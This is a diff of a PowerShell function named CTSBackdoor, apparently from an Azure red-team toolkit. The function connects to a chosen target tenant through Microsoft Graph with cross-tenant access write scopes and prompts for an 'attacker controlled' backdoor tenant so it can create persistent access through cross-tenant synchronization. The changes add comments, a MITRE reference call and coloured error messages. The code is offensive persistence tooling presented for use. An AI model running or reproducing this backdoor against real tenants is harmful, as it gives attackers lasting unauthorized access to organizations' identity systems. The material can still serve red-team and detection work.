@@ -1,5 +1,11 @@
 #Backdoor using Cross Tenant Synchronization
+<#
+    .NOTES
+    Roles required: Global administrator or Security administrator role.
+    Ref: https://learn.microsoft.com/en-us/azure/active-directory/external-identities/cross-tenant-access-overview
+#>
 function CTSBackdoor {
+    mitre_details("CTSBackdoor")
 
     $tenants = Get-AzTenant
     Write-Host "Available tenants:`n"
@@ -8,16 +14,18 @@ function CTSBackdoor {
     }
     Write-Host "`n"
 
+    #Select a target tenant
     $TargetTenantId = Read-Host -Prompt "Enter the tenant Id from list to target for backdoor access creation"
 
     #Connect to selected tenant
     Connect-MgGraph -TenantId $TargetTenantId -Scopes "Policy.Read.All","Policy.ReadWrite.CrossTenantAccess" | Out-Null
 
+    #Enter details for source tenant (attacker controlled tenant)
     $ExternalTenantId = Read-Host -Prompt "Enter the tenant ID of your tenant (backdoor tenant)"
 
     if ($null -eq $ExternalTenantId -or $null-eq $TargetTenantId) {
-        Write-Host "ExternalTenantId and TargetTenantId cannot be null."
-        Write-Host "Exiting module now!"
+        Write-Host "ExternalTenantId and TargetTenantId cannot be null." -ForegroundColor Red
+        Write-Host "Exiting backdoor module now!"
         break
     }
 
